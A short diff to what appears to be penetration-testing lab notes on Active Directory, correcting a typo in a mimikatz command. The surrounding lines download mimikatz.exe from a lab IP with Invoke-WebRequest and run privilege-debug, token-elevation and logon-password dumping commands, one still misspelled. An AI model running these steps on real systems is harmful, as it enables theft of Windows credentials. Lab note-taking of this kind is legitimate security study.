@@ -185,7 +185,7 @@ Our Site Name: Default-First-Site-Name
 ```c
     Invoke-WebRequest -Uri "http://192.168.45.219/mimikatz.exe" -OutFile "mimikatz.exe"
     mimikatz
-    -> riviliege::debug
+    -> privilege::debug
     -> token::elevate
     -> sekursa::logonpasswords
         Authentication Id : 0 ; 712535 (00000000:000adf57)
